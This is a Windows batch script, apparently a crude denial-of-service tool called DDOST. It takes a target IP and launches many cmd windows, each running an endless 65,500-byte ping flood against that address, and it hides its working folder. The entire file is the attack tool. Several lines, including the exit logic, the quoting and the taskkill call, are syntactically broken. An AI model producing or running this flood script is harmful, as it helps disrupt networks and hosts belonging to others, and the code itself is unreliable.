@echo off

if exist %userprofile%\key goto skip
  cls
  echo verifiedbypass>>%userprofile%\key
  md %temp%\DDOST\
  md %userprofile%\.ddost\
  md %userprofile%\.ddost\data\
  attrib +h %temp%\DDOST\

:skip
  echo IP:
  set /p ip=
    cls
      echo Amount of windows:
  set /p windows=
    cls
      echo ping %ip% -t -l 65500>>"%temp%\DDOST\run.bat"
      echo call "%userprofile%\.ddost\data\exitkey.bat>>"%temp%\DDOST\run.bat"
      echo if "%exit%"=="true" do exit>>"%temp%\DDOST\run.bat"
      echo Minimize Windows (Y/N):
  set /p mintf=
    cls
      if "%mintf%"=="Y" set mintf=/min
      if "%mintf%"=="N" set mintf=

for /l %%A in (1,1,%windows%) do start %mintf% "cmd.exe" "%temp%\DDOST\run.bat"
echo Press any button to exit
  pause >nul
    del /q "%temp%\DDOST\run.bat"
    echo set /a exit=true>>"%userprofile%\.ddost\data\exitkey.bat"
    taskkill /im /f cmd.exe
